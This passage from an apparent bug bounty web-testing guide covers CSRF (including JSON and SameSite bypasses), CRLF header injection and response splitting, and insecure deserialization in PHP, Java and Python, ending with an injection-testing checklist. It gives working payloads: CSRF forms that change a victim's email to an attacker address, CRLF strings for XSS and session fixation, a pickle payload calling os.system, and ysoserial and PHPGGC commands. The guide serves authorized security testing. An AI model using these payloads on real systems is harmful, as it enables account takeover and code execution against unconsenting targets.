<img src="https://target.com/api/user/delete?confirm=true" style="display:none">
```

**For multipart/form-data:**
```html
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="action" value="delete_account" />
  <input type="submit" value="Click me" />
</form>
```

---

#### 4.5.3 JSON CSRF

🔍 **When the endpoint only accepts JSON (`Content-Type: application/json`):**

Standard HTML forms can't send `application/json` — but there are bypasses:

```html
<!-- Approach 1: Send as text/plain (some servers don't check Content-Type) -->
<form action="https://target.com/api/settings" method="POST"
      enctype="text/plain">
  <!-- The name=value becomes the body: {"email":"attacker@evil.com"} -->
  <input type="hidden" name='{"email":"attacker@evil.com", "x":"' value='"}' />
</form>

<!-- Approach 2: fetch() with no-cors (can't read response, but request sends) -->
<script>
fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',   // sends cookies
  mode: 'no-cors',
  headers: {'Content-Type': 'application/json'},  // this triggers preflight!
  body: JSON.stringify({email: 'attacker@evil.com'})
})
// Note: application/json triggers CORS preflight → only works if CORS is misconfigured
// application/x-www-form-urlencoded does NOT trigger preflight
</script>

<!-- Approach 3: If server accepts both JSON and form-encoded -->
<form action="https://target.com/api/settings" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
```

---

#### 4.5.4 SameSite Bypass Scenarios

🔍 **SameSite=Lax is default in Chrome — but has exceptions:**
```
SameSite=Lax allows cookies on:
- Top-level navigation via GET (user clicks a link)
- So: GET-based state changes are still vulnerable even with Lax

SameSite=Strict blocks ALL cross-site requests including top-level navigation.
Near-impossible to bypass without a subdomain XSS.

Bypass via subdomain XSS:
- If target.com sets SameSite=Lax/Strict but you have XSS on sub.target.com
- XSS on same registrable domain → cookies sent (SameSite doesn't apply same-origin)
- Use XSS to send the CSRF request from sub.target.com

Bypass via cookie refresh (2-minute window):
- Newly set cookies (within 2 minutes of being set) are sent on cross-site
  top-level POST navigation in some browser versions
- Trigger re-authentication → new cookie → 2-minute window
```

📚 **References:**
- [PortSwigger CSRF labs](https://portswigger.net/web-security/csrf)
- [PortSwigger SameSite bypass](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)

---

### 4.6 CRLF Injection & Header Injection

**What it is:**
`\r\n` (Carriage Return + Line Feed) is the HTTP line separator. If user input
containing `\r\n` is inserted into an HTTP response header without sanitization,
an attacker can inject additional headers — or split the response entirely
to inject a full HTTP body.

---

#### 4.6.1 Detection

🔍 **Where to probe:**
```
Redirect parameters:   ?next=https://target.com%0d%0aHeader:injected
URL path:              /redirect/%0d%0aSet-Cookie:evil=1
Any value reflected    in a response header
in a response header:  Location, Set-Cookie, Link, etc.
```

**Probe strings:**
```
%0d%0a         → URL-encoded \r\n
%0D%0A         → uppercase variant
\r\n           → literal (if URL-decoded by server before use)
%0aHeader:x    → just LF (some servers accept LF alone)
%0d%0aX-Test:injected
%0d%0aSet-Cookie:csrf=evil%3Bpath%3D%2F
```

**Confirming injection:**
```bash
curl -sv "https://target.com/redirect?url=https://example.com%0d%0aX-Injected:yes" 2>&1 | \
  grep -i "x-injected"
# If "X-Injected: yes" appears in response headers → CRLF confirmed
```

---

#### 4.6.2 HTTP Response Splitting

🔍 **Full response injection — inject an entire second HTTP response:**
```
Payload:
%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>

The double \r\n\r\n ends the headers and starts the body:
HTTP/1.1 302 Found
Location: https://example.com
[injected \r\n\r\n]
<html><script>alert(document.domain)</script></html>

Result: Browser processes the injected body → XSS
```

---

#### 4.6.3 CRLF to XSS via Header Injection

🔍 **Inject a Set-Cookie header containing XSS payload:**
```
%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>

This injects:
Content-Type: text/html
X-XSS-Protection: 0
[body starts]
<script>alert(1)</script>
```

**CRLF → Session fixation via Set-Cookie:**
```
%0d%0aSet-Cookie:session=attacker_controlled_value;path=/

Injected header:
Set-Cookie: session=attacker_controlled_value; path=/

Victim visits URL → their session cookie set to attacker's value
→ Session fixation
```

📚 **References:**
- [PortSwigger — HTTP response splitting (CRLF)](https://portswigger.net/kb/issues/00200210_http-response-header-injection)
- [PayloadsAllTheThings — CRLF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)

---

### 4.7 Insecure Deserialization

**What it is:**
Applications serialize objects to transmit or store them (cookies, API parameters,
cache data). If user-controlled serialized data is deserialized without validation,
an attacker can manipulate the object's properties or trigger gadget chains
that execute arbitrary code during deserialization.

**The detection-first rule:** Deserialization bugs are complex to exploit.
In bug bounty, confirming the attack surface exists and demonstrating the class
of vulnerability is sufficient for a high-severity report. You don't need RCE PoC.

---

#### 4.7.1 Identifying Serialized Data

🔍 **Language-specific serialization signatures:**

| Language | Format | Signature |
|---------|--------|-----------|
| Java | Binary | Starts with `AC ED 00 05` (hex) or `rO0AB` (base64) |
| PHP | Text | `O:4:"User":2:{s:4:"name";s:4:"John";}` |
| Python pickle | Binary | Starts with `\x80\x02` or `\x80\x04` |
| Ruby Marshal | Binary | Starts with `\x04\x08` |
| .NET (BinaryFormatter) | Binary | Starts with `AAEAAAD/////` (base64) |
| JSON (generic) | Text | `{"__type":"..."}` with type hints |

**Where to look:**
```
Cookies (base64-decode them all — look for signatures above)
Hidden form fields
API request body parameters
Cache-related headers
Viewstate in .NET apps (__VIEWSTATE parameter)
Remember-me tokens
Session data
```

```bash
# Decode and check cookies:
echo "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==" | base64 -d | xxd | head -2
# AC ED 00 05 → Java serialization confirmed

# PHP serialization is plaintext after base64 decode:
echo "TzoxMDoiVXNlck9iamVjdCI6MTp7czo0OiJuYW1lIjtzOjQ6IkpvaG4iO30=" | base64 -d
# O:10:"UserObject":1:{s:4:"name";s:4:"John";}
```

---

#### 4.7.2 PHP Deserialization

🔍 **PHP object injection — manipulate object properties:**
```php
// Original cookie (base64-decoded):
O:4:"User":1:{s:4:"role";s:4:"user";}

// Tampered (change role):
O:4:"User":1:{s:4:"role";s:5:"admin";}

// Re-encode:
php -r 'echo base64_encode(serialize((object)["role"=>"admin"]));'

// Magic methods exploitable during deserialization:
// __wakeup() — called on unserialize
// __destruct() — called when object is garbage collected
// __toString() — called when object used as string
// Finding a gadget: look for these in the app's codebase
```

**PoC — property manipulation (safe, no RCE needed for report):**
```
1. Find serialized object in cookie/parameter
2. Decode (base64), identify PHP serialization
3. Modify a property value (e.g., role, is_admin, user_id)
4. Re-encode and re-submit
5. If app behavior changes → PHP deserialization vulnerability confirmed
6. Report: describe the gadget chain potential, reference PHPGGC
```

🛠️ **PHPGGC — PHP gadget chain generator:**
```bash
# List available chains for common frameworks:
phpggc --list | grep -i "laravel\|symfony\|yii\|guzzle"

# Generate RCE payload for Laravel:
phpggc Laravel/RCE1 system id | base64 -w0
# Use in PoC only if program allows RCE demonstration
```

---

#### 4.7.3 Java Deserialization

🔍 **Detection without exploitation:**
```bash
# Confirm Java serialized data (base64):
echo "<cookie_value>" | base64 -d | xxd | head -1
# Look for: ac ed 00 05  → Java serialization magic bytes

# ysoserial — generates payloads using known gadget chains
# List available gadgets:
java -jar ysoserial.jar 2>&1 | head -30

# Generate OOB payload (DNS callback — safe for live targets):
java -jar ysoserial.jar URLDNS "http://$(id).abc123.interactsh.com" | base64 -w0

# Submit as the serialized cookie/parameter
# Check interactsh for DNS callback → confirms deserialization is occurring
```

**Safe PoC approach:**
```
1. Generate URLDNS payload (triggers DNS lookup only — no RCE, no harm)
2. Submit as the serialized parameter
3. Monitor interactsh for DNS callback
4. DNS callback confirmed = deserialization is occurring
5. Report: Java deserialization confirmed via DNS callback.
   Gadget chains available (CommonsCollections1-7, Spring, etc.)
   Potential for RCE via ysoserial gadgets.
```

---

#### 4.7.4 Python Pickle

🔍 **Detection and safe PoC:**
```python
import pickle, os, base64

# Check if data looks like pickle:
# Pickle starts with \x80\x02 (protocol 2) or \x80\x04 (protocol 4)
data = base64.b64decode("<parameter_value>")
if data[:2] in [b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05']:
    print("Python pickle detected")

# Safe PoC — generate OOB payload:
class OOBPayload:
    def __reduce__(self):
        return (os.system, ('nslookup abc123.interactsh.com',))

payload = base64.b64encode(pickle.dumps(OOBPayload())).decode()
print(payload)
# Submit as the parameter, watch interactsh for DNS callback
```

⚠️ **Gotchas:**
- Never submit RCE payloads (reverse shells, file writes) on production systems.
  DNS callback (URLDNS/nslookup) is the safe PoC standard for deserialization.
- Many programs treat confirmed deserialization with DNS callback as High/Critical
  without requiring a full RCE demonstration.

📚 **References:**
- [PortSwigger — Deserialization](https://portswigger.net/web-security/deserialization)
- [ysoserial](https://github.com/frohoff/ysoserial)
- [PHPGGC](https://github.com/ambionics/phpggc)
- [PayloadsAllTheThings — Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)

---

### 4.8 XML Injection / XXE

→ Full coverage in **[Part 5.3: XXE](#53-xxe)**.
XML injection as a standalone (without external entity) is largely superseded
by XXE and SSTI. If you find an XML input that doesn't trigger XXE, check for
XPath injection using the same quote-based probes as SQLi.

---

### Part 4 — Complete Injection Testing Checklist

```
XSS
□ Canary string in every input → find reflection point
□ Identify rendering context (HTML body, attribute, JS string, URL)
□ Test with context-appropriate payloads
□ Run Dalfox on all parameterized URLs
□ Run DOM Invader while manually browsing
□ Check URL hash (#) for DOM XSS source
□ Install blind XSS payload in all stored fields
□ Read CSP header → evaluate for bypasses
□ Escalate: cookie theft, CSRF-via-XSS, token theft from localStorage

SQL INJECTION
□ Single quote in every parameter → error or behavior change?
□ Boolean true/false conditions → response difference?
□ SLEEP() → time delay confirms blind injection
□ Non-standard locations: headers, cookies, ORDER BY, JSON body
□ Second-order: register with SQL payload, trigger via profile update
□ sqlmap at level=1/risk=1 to confirm (throttled, no --os-shell)
□ Capture DB version + current user as PoC, stop there

SSTI
□ Polyglot probe {{7*7}}${7*7}<%= 7*7 %> in all rendered fields
□ Math result (49) in response confirms injection
□ Identify engine via differentiation probes
□ Blind SSTI: OOB via DNS before attempting RCE
□ SSTImap for automated exploitation

COMMAND INJECTION
□ Shell separators: ;id &&id ||id |id $(id) `id` after every input
□ Blind: sleep 5 → time delay
□ Blind OOB: nslookup $(whoami).interactsh.com
□ Image/file processing features (ImageMagick, ffmpeg)
□ Network utility features (ping, DNS lookup, traceroute)
□ Document generation features

CSRF
□ State-changing endpoints: is CSRF token present?
□ Token bypass: remove it, empty it, use your own token for victim
□ SameSite cookie attribute: Strict/Lax/None?
□ GET-based state changes (vulnerable even with SameSite=Lax)
□ JSON endpoints: text/plain PoC, check if form-encoded also accepted
□ Build auto-submitting PoC HTML, confirm action executes

CRLF
□ %0d%0a in redirect/URL parameters
□ Inject X-Test header → confirm in response
□ Escalate: Set-Cookie injection → session fixation
□ Escalate: double CRLF → response splitting → XSS

DESERIALIZATION
□ Base64-decode all cookies → check for serialization magic bytes
□ Java: AC ED 00 05 / rO0AB → ysoserial URLDNS OOB PoC
□ PHP: O:N: pattern → property manipulation PoC
□ Python: \x80\x02 → pickle OOB PoC
□ .NET: AAEAAAD → ViewState tampering
□ Hidden form fields, remember-me tokens, cache params
```

📚 **Part 4 Master References:**
- [PortSwigger Web Security Academy — all injection labs](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks — Web Pentesting](https://book.hacktricks.xyz/pentesting-web)
- [SSTImap](https://github.com/vladko312/SSTImap)
- [ysoserial](https://github.com/frohoff/ysoserial)
- [PHPGGC](https://github.com/ambionics/phpggc)
